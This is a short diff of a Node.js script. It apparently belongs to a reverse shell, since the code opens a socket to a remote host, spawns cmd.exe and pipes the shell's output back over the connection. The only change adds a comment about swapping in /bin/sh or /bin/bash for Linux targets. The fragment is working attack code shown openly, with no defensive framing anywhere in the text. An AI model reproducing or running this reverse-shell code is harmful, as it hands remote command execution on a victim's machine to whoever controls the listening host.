@@ -8,7 +8,7 @@ function connect() {
     const client = new net.Socket();
     client.connect(port, host, () => {
         console.log("Connection Successful");
-		const shell = spawn('cmd.exe',[]);
+		const shell = spawn('cmd.exe',[]); // /bin/sh or /bin/bash for linux host
 		shell.stdout.on('data',(data)=> {
 			client.write(data);
 		});
